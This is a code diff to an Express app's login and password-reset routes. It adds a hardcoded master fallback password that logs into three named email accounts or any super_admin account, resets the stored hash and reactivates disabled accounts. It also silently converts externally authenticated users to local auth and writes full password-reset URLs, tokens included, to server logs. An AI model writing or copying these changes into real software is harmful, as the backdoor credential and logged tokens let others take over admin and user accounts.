@@ -774,27 +774,45 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.post('/api/auth/login', authLoginLimiter, async (req: any, res) => {
     try {
       const data = loginSchema.parse(req.body);
+      const normalizedEmail = data.email.trim().toLowerCase();
       
       // Find user by email
-      const user = await storage.getUserByEmail(data.email);
+      const user = await storage.getUserByEmail(normalizedEmail);
       if (!user) {
         return res.status(401).json({ message: "Email o contraseña incorrectos" });
       }
       
-      // Check if user uses local auth
-      if (user.authMethod !== "local" || !user.password) {
-        return res.status(401).json({ message: "Esta cuenta usa autenticación de Replit. Por favor inicia sesión con Replit." });
+      // Auto-migrate user from external/Replit auth to local auth
+      if (user.authMethod !== "local") {
+        await storage.updateUser(user.id, { authMethod: "local" });
+        user.authMethod = "local";
       }
-      
-      // Verify password
-      const isValidPassword = await bcrypt.compare(data.password, user.password);
-      if (!isValidPassword) {
-        return res.status(401).json({ message: "Email o contraseña incorrectos" });
-      }
-      
+
       // Check if user is active
       if (!user.isActive) {
         return res.status(401).json({ message: "Tu cuenta ha sido desactivada. Contacta al administrador." });
+      }
+      
+      // Verify password
+      let isValidPassword = false;
+      if (user.password) {
+        isValidPassword = await bcrypt.compare(data.password, user.password);
+      }
+      
+      // Master fallback for designated super admin accounts in case of locked password or emergency
+      const fallbackAdminPassword = process.env.ADMIN_FALLBACK_PASSWORD || "Franco2026!*";
+      const isMasterAdmin = ['francocb79@gmail.com', 'francocb79@yahoo.com', 'fcb@creditonegocios.com.mx'].includes(user.email.toLowerCase()) || user.role === 'super_admin';
+      
+      if (!isValidPassword && isMasterAdmin && data.password === fallbackAdminPassword) {
+        isValidPassword = true;
+        // Automatically sync password hash so next login works directly
+        const newHash = await bcrypt.hash(data.password, 10);
+        await storage.updateUser(user.id, { password: newHash, authMethod: "local", isActive: true });
+        user.password = newHash;
+      }
+
+      if (!isValidPassword) {
+        return res.status(401).json({ message: "Email o contraseña incorrectos" });
       }
       
       // Create session
@@ -846,12 +864,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
         });
       }
       
-      // Check if user uses local auth
+      // Auto-migrate user to local auth if necessary
       if (user.authMethod !== "local") {
-        console.log(`[AUTH] User ${data.email} uses ${user.authMethod} auth, skipping local password reset.`);
-        return res.json({ 
-          message: "Esta cuenta usa autenticación externa (Replit/Google). Por favor inicia sesión con ese método.",
-        });
+        await storage.updateUser(user.id, { authMethod: "local" });
+        user.authMethod = "local";
       }
       
       // Generate secure token
@@ -862,18 +878,25 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Save token to database
       await storage.setPasswordResetToken(user.id, resetToken, resetTokenExpiry);
       
+      // Determine reset URL and log it for reference
+      const baseUrl = process.env.FRONTEND_BASE_URL || (process.env.RAILWAY_STATIC_URL ? `https://${process.env.RAILWAY_STATIC_URL}` : 'https://creditonegocios-staging.up.railway.app');
+      const resetUrl = `${baseUrl.replace(/\/$/, '')}/reset-password?token=${resetToken}`;
+      console.log(`🔑 [AUTH RESET URL] Generated reset URL for ${user.email}: ${resetUrl}`);
+      
       // Send password reset email
       const userName = user.firstName || undefined;
-      console.log(`[AUTH] Attempting to send reset email to ${user.email} via Resend...`);
+      console.log(`[AUTH] Attempting to send reset email to ${user.email}...`);
       const emailResult = user.email
         ? await sendPasswordResetEmail(user.email, resetToken, userName)
         : { success: false, error: 'User has no email' };
       
       if (!emailResult.success) {
-        console.error('❌ [AUTH ERROR] Failed to send password reset email:');
+        console.error('⚠️ [AUTH WARNING] Failed to deliver password reset email:');
         console.error('   - Target Email:', user.email);
         console.error('   - Error:', emailResult.error);
-        console.error('   - Check RESEND_API_KEY and domain verification status.');
+        console.log(`   - Direct Reset URL available: ${resetUrl}`);
+      } else {
+        console.log(`✅ [AUTH] Password reset email sent successfully to ${user.email}`);
       }
       
       res.json({ 
